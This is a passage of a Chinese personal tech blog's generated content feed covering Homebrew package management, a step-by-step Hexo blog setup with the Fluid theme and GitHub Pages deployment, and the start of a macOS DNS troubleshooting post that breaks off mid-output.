<span class="hljs-number">19.6</span>MB)<br>protobuf <span class="hljs-number">21.4</span> and <span class="hljs-number">3.19</span>.<span class="hljs-number">4</span> are still installed.<br>To remove all versions, run:<br>  brew uninstall --force protobuf<br>Uninstalling <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>libffi/<span class="hljs-number">3.4</span>.<span class="hljs-number">2</span>... (<span class="hljs-number">17</span> files, <span class="hljs-number">673.3</span>KB)<br></code></pre></td></tr></table></figure><h2 id="查看安装的包"><a href="#查看安装的包" class="headerlink" title="查看安装的包"></a>查看安装的包</h2><p>brew list –formula | grep 包关键字</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mel">➜   brew list --formula | grep <span class="hljs-keyword">python</span><br><span class="hljs-keyword">python</span>-certifi<br><span class="hljs-keyword">python</span>-cryptography<br><span class="hljs-keyword">python</span>-packaging<br><span class="hljs-keyword">python</span>@3<span class="hljs-number">.10</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applicatons</category>
      
      <category>macapplications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applicatons</tag>
      
      <tag>mac</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo_install</title>
    <link href="/2024/12/15/yunwei/hexo/hexo_install/"/>
    <url>/2024/12/15/yunwei/hexo/hexo_install/</url>
    
    <content type="html"><![CDATA[<h2 id="安装基础环境"><a href="#安装基础环境" class="headerlink" title="安装基础环境"></a>安装基础环境</h2><h3 id="安装npm"><a href="#安装npm" class="headerlink" title="安装npm"></a>安装npm</h3><p>brew install npm</p><p>npm -v 查看已安装版本</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">➜  tthours <span class="hljs-built_in">npm</span> -v<br><span class="hljs-number">10.9</span><span class="hljs-number">.2</span><br></code></pre></td></tr></table></figure><h3 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h3><p>brew install node</p><p>node -v 查看已安装版本</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">➜  tthours <span class="hljs-keyword">node</span> <span class="hljs-title">-v</span><br>v23.<span class="hljs-number">4.0</span><br></code></pre></td></tr></table></figure><h3 id="安装hexo-cli"><a href="#安装hexo-cli" class="headerlink" title="安装hexo-cli"></a>安装hexo-cli</h3><p>npm install -g hexo-cli </p><h2 id="博客部署"><a href="#博客部署" class="headerlink" title="博客部署"></a>博客部署</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>hexo init 博客文件夹</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso">➜  tthours hexo init tthourshexo    <br>INFO  Cloning hexo<span class="hljs-params">-starter</span> https:<span class="hljs-comment">//github.com/hexojs/hexo-starter.git</span><br>INFO  Install dependencies<br><span class="hljs-params">...</span>.<br><span class="hljs-params">...</span>.<br>INFO  Start blogging <span class="hljs-keyword">with</span> Hexo!<br></code></pre></td></tr></table></figure><p>初始化之后会在当前目录创建 博客文件夹，文件夹中会存在以下目录及文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-built_in">config</span>.landscape.yml<br><span class="hljs-built_in">config</span>.yml<br>node modules  <span class="hljs-comment">#目录</span><br>package-lock.<span class="hljs-keyword">json</span><br><span class="hljs-keyword"></span>package.<span class="hljs-keyword">json</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">scaffolds </span> <span class="hljs-comment">#目录</span><br>source  <span class="hljs-comment">#目录</span><br>themes  <span class="hljs-comment">#目录</span><br>yarn.lock<br></code></pre></td></tr></table></figure><h3 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h3><p>进入创建的 博客文件夹</p><p>cd tthourshexo  </p><p>创建文件</p><p>hexo new hexo_install</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  tthourshexo hexo new hexo_install<br>INFO  Validating config<br>INFO  Created: ~/tthours/tthourshexo/source/_posts/hexo-install.md<br></code></pre></td></tr></table></figure><p>静态化处理</p><p>hexo g</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">➜  tthourshexo hexo g<br><span class="hljs-built_in">INFO</span>  Validating<span class="hljs-built_in"> config</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">INFO</span>  Start processing<br><span class="hljs-built_in">INFO</span>  Files loaded <span class="hljs-keyword">in</span> 159 ms<br><span class="hljs-built_in">INFO</span>  Generated: index.html<br><span class="hljs-built_in">INFO</span>  Generated: archives/index.html<br><span class="hljs-built_in">INFO</span>  Generated: js/script.js<br><span class="hljs-built_in">INFO</span>  Generated: css/style.css<br><span class="hljs-built_in">INFO</span>  Generated: archives/2024/12/index.html<br><span class="hljs-built_in">INFO</span>  Generated: fancybox/jquery.fancybox.min.css<br><span class="hljs-built_in">INFO</span>  Generated: archives/2024/index.html<br><span class="hljs-built_in">INFO</span>  Generated: fancybox/jquery.fancybox.min.js<br><span class="hljs-built_in">INFO</span>  Generated: js/jquery-3.6.4.min.js<br><span class="hljs-built_in">INFO</span>  Generated: css/images/banner.jpg<br><span class="hljs-built_in">INFO</span>  Generated: 2024/12/15/hello-world/index.html<br><span class="hljs-built_in">INFO</span>  Generated: 2024/12/15/hexo-install/index.html<br><span class="hljs-built_in">INFO</span>  12 files generated <span class="hljs-keyword">in</span> 109 ms<br></code></pre></td></tr></table></figure><p>启动服务预览</p><p>hexo s</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  tthourshexo hexo s<br><span class="hljs-keyword">INFO</span>  Validating config<br><span class="hljs-keyword">INFO</span>  <span class="hljs-keyword">Start</span> processing<br><span class="hljs-keyword">INFO</span>  Hexo <span class="hljs-keyword">is</span> running at http://localhost:<span class="hljs-number">4000</span>/ . Press Ctrl+C <span class="hljs-keyword">to</span> stop.<br></code></pre></td></tr></table></figure><p>本地测试</p><p><a href="http://localhost:4000/">http://localhost:4000/</a></p><h2 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h2><p>在hexo选择主题<a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></p><p>在博客文件夹下安装</p><p>npm install –save hexo-theme-fluid</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">➜  tthourshexo npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br><br>up <span class="hljs-keyword">to</span> <span class="hljs-built_in">date</span>, audited <span class="hljs-number">224</span> packages <span class="hljs-keyword">in</span> <span class="hljs-number">2</span>s<br><br><span class="hljs-number">24</span> packages are looking <span class="hljs-keyword">for</span> funding<br>  <span class="hljs-built_in">run</span> `npm fund` <span class="hljs-keyword">for</span> details<br><br>found <span class="hljs-number">0</span> vulnerabilities<br></code></pre></td></tr></table></figure><p>fluid主题</p><p><a href="https://github.com/fluid-dev/hexo-theme-fluid?tab=readme-ov-file">https://github.com/fluid-dev/hexo-theme-fluid?tab=readme-ov-file</a></p><h2 id="关联GitHub"><a href="#关联GitHub" class="headerlink" title="关联GitHub"></a>关联GitHub</h2><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><h4 id="修改默认配置文件"><a href="#修改默认配置文件" class="headerlink" title="修改默认配置文件"></a>修改默认配置文件</h4><p>根目录下默认的_config.yml</p><h5 id="修改site"><a href="#修改site" class="headerlink" title="修改site"></a>修改site</h5><p>默认值</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"># Site<br><span class="hljs-symbol">title:</span> Hexo<br><span class="hljs-symbol">subtitle:</span> <span class="hljs-comment">&#x27;&#x27;</span><br><span class="hljs-symbol">description:</span> <span class="hljs-comment">&#x27;&#x27;</span><br><span class="hljs-symbol">keywords:</span><br><span class="hljs-symbol">author:</span> John Doe<br><span class="hljs-symbol">language:</span> en<br><span class="hljs-symbol">timezone:</span> <span class="hljs-comment">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>修改后</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"># Site<br><span class="hljs-symbol">title:</span> Ten thousand hours<br><span class="hljs-symbol">subtitle:</span> <span class="hljs-comment">&#x27;Ten thousand hours&#x27;</span><br><span class="hljs-symbol">description:</span> <span class="hljs-comment">&#x27;Ten thousand hours&#x27;</span><br><span class="hljs-symbol">keywords:</span><br><span class="hljs-symbol">author:</span> tt<br><span class="hljs-symbol">language:</span> zh-CN<br><span class="hljs-symbol">timezone:</span> <span class="hljs-comment">&#x27;Asia/Shanghai&#x27;</span><br></code></pre></td></tr></table></figure><p>url: <a href="http://example.com/">http://example.com</a></p><p>修改为</p><p>url: <a href="https://tthours.github.io/">https://tthours.github.io</a></p><h5 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h5><p>theme: fluid</p><h5 id="修改环境"><a href="#修改环境" class="headerlink" title="修改环境"></a>修改环境</h5><p>原始</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"># Deployment<br>## Docs: https:<span class="hljs-comment">//hexo.io/docs/one-command-deployment</span><br>deploy:<br>  type: <span class="hljs-string">&#x27;&#x27;</span><br>  <br></code></pre></td></tr></table></figure><p>修改后</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">deploy:</span><br>  <span class="hljs-params">type:</span> &#x27;git&#x27;<br>  <span class="hljs-params">repository:</span> git@tthoursgithub.com:tthours<span class="hljs-symbol">/tthours.github.io.git</span><br>  <span class="hljs-params">branch:</span> main<br></code></pre></td></tr></table></figure><h3 id="修改主题配置文件"><a href="#修改主题配置文件" class="headerlink" title="修改主题配置文件"></a>修改主题配置文件</h3><p>如果有安装对应的主题，就需要新建主题对应的配置文件，复制默认配置文件进行修改</p><p>例如：fluid主题，创建_config.fluid.yml</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># Hexo Configuration</span><br><span class="hljs-comment"># 用于浏览器标签的图标</span><br><span class="hljs-comment"># Icon for browser tab</span><br><span class="hljs-comment"># 注意必须是png后缀格式</span><br><span class="hljs-params">favicon:</span> <span class="hljs-symbol">/img/hd.png</span><br><br><span class="hljs-comment"># 用于苹果设备的图标</span><br><span class="hljs-comment"># Icon for Apple touch</span><br><span class="hljs-params">apple_touch_icon:</span> <span class="hljs-symbol">/img/hd.png</span><br><br><span class="hljs-comment"># 导航栏的相关配置</span><br><span class="hljs-comment"># Navigation bar</span><br><span class="hljs-params">navbar:</span><br>  <span class="hljs-comment"># 导航栏左侧的标题，为空则按 hexo config 中 `title` 显示</span><br>  <span class="hljs-comment"># The title on the left side of the navigation bar. If empty, it is based on `title` in hexo config</span><br>  <span class="hljs-params">blog_title:</span> <span class="hljs-string">&quot;10000hours&quot;</span><br><br><span class="hljs-params">index:</span><br>  <span class="hljs-params">slogan:</span><br>    <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">text:</span> <span class="hljs-string">&quot;每个人都需要对自己的人生负责&quot;</span><br>    <span class="hljs-comment">#api:</span><br>    <span class="hljs-comment">#  enable: false</span><br>    <span class="hljs-comment">#  url: &quot;https://v1.hitokoto.cn/&quot;</span><br>    <span class="hljs-comment">#  method: &quot;GET&quot;</span><br>    <span class="hljs-comment">#  headers: &#123;&#125;</span><br>    <span class="hljs-comment">#  keys: [&quot;hitokoto&quot;]</span><br>  <span class="hljs-params">post_url_target:</span> _blank<br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 文章页</span><br><span class="hljs-comment"># Post Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-params">post:</span><br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">banner_img_height:</span> <span class="hljs-number">70</span><br><br><br>  <span class="hljs-params">updated:</span><br>    <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># 格式参照 ISO-8601 日期格式化</span><br>    <span class="hljs-comment"># ISO-8601 date format</span><br>    <span class="hljs-comment"># See: http://momentjs.cn/docs/#/parsing/string-format/</span><br>    <span class="hljs-params">date_format:</span> <span class="hljs-string">&quot;LL a&quot;</span><br><br>    <span class="hljs-comment"># 是否使用相对时间表示，比如：&quot;3 天前&quot;</span><br>    <span class="hljs-comment"># If true, it will be a relative time, such as: &quot;3 days ago&quot;</span><br>    <span class="hljs-params">relative:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># 提示标签类型</span><br>    <span class="hljs-comment"># Note class</span><br>    <span class="hljs-comment"># Options: default | primary | info | success | warning | danger | light</span><br>    <span class="hljs-params">note_class:</span> info<br>    <span class="hljs-comment"># 版权声明，会显示在每篇文章的结尾</span><br>  <span class="hljs-comment"># Copyright, will be displayed at the end of each post</span><br>  <span class="hljs-params">copyright:</span><br>    <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># CreativeCommons license</span><br>    <span class="hljs-comment"># Options: BY | BY-SA | BY-ND | BY-NC | BY-NC-SA | BY-NC-ND</span><br>    <span class="hljs-params">license:</span> &#x27;BY TT&#x27;<br><br>    <span class="hljs-comment"># 显示作者</span><br>    <span class="hljs-params">author:</span><br>      <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># 显示发布日期</span><br>    <span class="hljs-comment"># Show post date</span><br>    <span class="hljs-params">post_date:</span><br>      <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-params">format:</span> <span class="hljs-string">&quot;LL&quot;</span><br><br>    <span class="hljs-comment"># 显示更新日期</span><br>    <span class="hljs-comment"># Show update date</span><br>    <span class="hljs-params">update_date:</span><br>      <span class="hljs-params">enable:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-params">format:</span> <span class="hljs-string">&quot;LL&quot;</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 归档页</span><br><span class="hljs-comment"># Archive Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-params">archive:</span><br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">banner_img_height:</span> <span class="hljs-number">60</span><br>  <span class="hljs-params">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 分类页</span><br><span class="hljs-comment"># Category Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-params">category:</span><br>  <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">banner_img_height:</span> <span class="hljs-number">60</span><br>  <span class="hljs-params">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br><br>  <span class="hljs-comment"># 分类的排序字段，前面带减号是倒序，不带减号是正序</span><br>  <span class="hljs-comment"># Sort field for categories, with a minus sign is reverse order</span><br>  <span class="hljs-comment"># Options: length | name</span><br>  <span class="hljs-params">order_by:</span> <span class="hljs-string">&quot;-length&quot;</span><br><br>  <span class="hljs-comment"># 层级的折叠深度，0 是全部折叠，大于 0 后如果存在子分类则默认展开</span><br>  <span class="hljs-comment"># Collapse depth. If 0, all posts collapsed. If greater than 0, it will be expanded by default if there are subcategories</span><br>  <span class="hljs-params">collapse_depth:</span> <span class="hljs-number">0</span><br><br>  <span class="hljs-comment"># 文章的排序字段，前面带减号是倒序，不带减号是正序</span><br>  <span class="hljs-comment"># Sort field for posts, with a minus sign is reverse order</span><br>  <span class="hljs-comment"># Options: date | title | or other field of front-matter</span><br>  <span class="hljs-params">post_order_by:</span> <span class="hljs-string">&quot;-date&quot;</span><br><br>  <span class="hljs-comment"># 单个分类中折叠展示文章数的最大值，超过限制会显示 More，0 则不限制</span><br>  <span class="hljs-comment"># The maximum number of posts in a single category. If the limit is exceeded, it will be displayed More. If 0 no limit</span><br>  <span class="hljs-params">post_limit:</span> <span class="hljs-number">10</span><br><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 标签页</span><br><span class="hljs-comment"># Tag Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-params">tag:</span><br>  <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">banner_img_height:</span> <span class="hljs-number">80</span><br>  <span class="hljs-params">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br>  <span class="hljs-params">tagcloud:</span><br>    <span class="hljs-params">min_font:</span> <span class="hljs-number">15</span><br>    <span class="hljs-params">max_font:</span> <span class="hljs-number">30</span><br>    <span class="hljs-params">unit:</span> px<br>    <span class="hljs-params">start_color:</span> <span class="hljs-string">&quot;#BBBBEE&quot;</span><br>    <span class="hljs-params">end_color:</span> <span class="hljs-string">&quot;#337ab7&quot;</span><br><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 关于页</span><br><span class="hljs-comment"># About Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-params">about:</span><br>  <span class="hljs-params">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">banner_img:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">banner_img_height:</span> <span class="hljs-number">60</span><br>  <span class="hljs-params">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br>  <span class="hljs-params">avatar:</span> <span class="hljs-symbol">/img/hd.png</span><br>  <span class="hljs-params">name:</span> <span class="hljs-string">&quot;TT&quot;</span><br>  <span class="hljs-params">intro:</span> <span class="hljs-string">&quot;TT&quot;</span><br>  <span class="hljs-comment"># 更多图标可从 https://hexo.fluid-dev.com/docs/icon/ 查找，`class` 代表图标的 css class，添加 `qrcode` 后，图标不再是链接而是悬浮二维码</span><br>  <span class="hljs-comment"># More icons can be found from https://hexo.fluid-dev.com/docs/en/icon/  `class` is the css class of the icon. If adding `qrcode`, The icon is no longer a link, but a hovering QR code</span><br>  <span class="hljs-params">icons:</span><br>    <span class="hljs-operator">-</span> &#123; <span class="hljs-params">class:</span> <span class="hljs-string">&quot;iconfont icon-github-fill&quot;</span>, <span class="hljs-params">link:</span> <span class="hljs-string">&quot;https://github.com&quot;</span>, <span class="hljs-params">tip:</span> <span class="hljs-string">&quot;GitHub&quot;</span> &#125;<br>    <span class="hljs-operator">-</span> &#123; <span class="hljs-params">class:</span> <span class="hljs-string">&quot;iconfont icon-douban-fill&quot;</span>, <span class="hljs-params">link:</span> <span class="hljs-string">&quot;https://douban.com&quot;</span>, <span class="hljs-params">tip:</span> <span class="hljs-string">&quot;豆瓣&quot;</span> &#125;<br>    <span class="hljs-operator">-</span> &#123; <span class="hljs-params">class:</span> <span class="hljs-string">&quot;iconfont icon-wechat-fill&quot;</span>, <span class="hljs-params">qrcode:</span> <span class="hljs-string">&quot;/img/favicon.png&quot;</span> &#125;<br></code></pre></td></tr></table></figure><h3 id="安装部署工具"><a href="#安装部署工具" class="headerlink" title="安装部署工具"></a>安装部署工具</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br><br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">➜  tthourshexo npm <span class="hljs-keyword">install </span>hexo-deployer-git --save<br><br><br><span class="hljs-keyword">added </span><span class="hljs-number">9</span> packages, <span class="hljs-keyword">and </span>audited <span class="hljs-number">233</span> packages in <span class="hljs-number">4</span>s<br><br><span class="hljs-number">30</span> packages are looking for funding<br>  run `npm fund` for details<br><br>found <span class="hljs-number">0</span> vulnerabilities<br></code></pre></td></tr></table></figure><h2 id="静态化文件"><a href="#静态化文件" class="headerlink" title="静态化文件"></a>静态化文件</h2><p>hexo g</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>hexo d</p>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>error_mac_更换网络环境DNS无法切换</title>
    <link href="/2024/11/23/yunwei/errors/Macerrors/error_mac_%E6%9B%B4%E6%8D%A2%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83DNS%E6%97%A0%E6%B3%95%E5%88%87%E6%8D%A2/"/>
    <url>/2024/11/23/yunwei/errors/Macerrors/error_mac_%E6%9B%B4%E6%8D%A2%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83DNS%E6%97%A0%E6%B3%95%E5%88%87%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Apple M1  macOS Sonoma 14.5</p><p>mac电脑从  A  网络环境切换到 B 网络环境后，出现可以 ping  通，但是无法解析域名的情况</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">➜  /<span class="hljs-built_in"> ping </span>8.8.8.8<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>8.8.8.8 (8.8.8.8): 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> 8.8.8.8: <span class="hljs-attribute">icmp_seq</span>=0 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=47.866 ms<br>64 bytes <span class="hljs-keyword">from</span> 8.8.8.8: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=51.305 ms<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  / ping www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br>ping: cannot resolve www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>: Unknown host<br></code></pre></td></tr></table></figure><h2 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h2><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><p>1、检查DNS配置文件 &#x2F;etc&#x2F;resolv.conf 是 A 网络环境的DNS</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nameserver</span> <span class="hljs-number">10.211.1.8</span><br>nameserver <span class="hljs-number">10.211.133.8</span><br></code></pre></td></tr></table></figure><p>2、同时使用 scutil –dns 查看本机 DNS配置</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs ada">➜  / scutil <span class="hljs-comment">--dns</span><br>DNS configuration<br><br>resolver #<span class="hljs-number">1</span><br>  nameserver[<span 